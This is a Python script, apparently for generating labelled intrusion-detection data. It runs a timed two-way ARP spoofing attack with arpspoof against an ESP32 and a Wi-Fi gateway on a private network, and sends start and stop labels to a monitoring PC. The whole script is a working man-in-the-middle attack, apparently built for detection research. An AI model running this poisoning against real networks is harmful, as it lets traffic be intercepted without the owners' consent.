import os
import socket
import time
import subprocess

# Configuration
PC_IP = '192.168.0.13'        # Raspberry Pi or monitoring PC IP (where labels are sent)
PC_PORT = 9999

TARGET_IP = '192.168.0.15'    # ESP32 Target IP
GATEWAY_IP = '192.168.0.1'     # Wi-Fi router gateway IP (the device we're impersonating in the ARP spoof)
INTERFACE = 'eth1'             # Kali interface connected to the same network as the ESP32

ATTACK_DURATION = 15          # Duration of the ARP spoofing attack in seconds

LABEL_REPEATS = 1
LABEL_PAUSE = 0.2

def send_label(status, repeats=LABEL_REPEATS, pause=LABEL_PAUSE):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(repeats):
        # Send JSON-formatted labels to simplify later dataset parsing
        message = f'{{"status": "{status}", "attack_type": "ARP_SPOOF", "timestamp": {time.time()}}}'
        try:
            sock.sendto(message.encode(), (PC_IP, PC_PORT))
        except OSError as e:
            print(f"⚠️ label sending failure: {e}")
        time.sleep(pause)

# Enable IP forwarding on Kali to allow traffic to be routed through it during the ARP spoofing attack
print(">>> Enabling Kali IP forwarding...")
os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")

print(">>> READY FOR ARP SPOOF ATTACK, NOTIFY THE LABELERS")
send_label("START")
time.sleep(1)

print(f">>> Starting Two-Way ARP Spoofing via {INTERFACE}...")

# Poisoning target ESP32: Map Gateway's IP to Kali's MAC address
cmd1 = ["sudo", "arpspoof", "-i", INTERFACE, "-t", TARGET_IP, GATEWAY_IP]
# Poisoning Wi-Fi Router: Map ESP32's IP to Kali's MAC address
cmd2 = ["sudo", "arpspoof", "-i", INTERFACE, "-t", GATEWAY_IP, TARGET_IP]

# Launch both spoofing tasks concurrently in the background
proc1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
proc2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Maintain the attack duration state; labels remain in "ATTACK" mode during this window
print(f">>> Starting ARP Spoofing against {TARGET_IP} for {ATTACK_DURATION} seconds...")
time.sleep(ATTACK_DURATION)

# Terminate background processes cleanly to restore network topology
print(">>> Stopping ARP Spoofing tools...")
proc1.terminate()
proc2.terminate()
proc1.wait()
proc2.wait()

time.sleep(1)
send_label("STOP")
print(" >>> ATTACK IS FINISHED")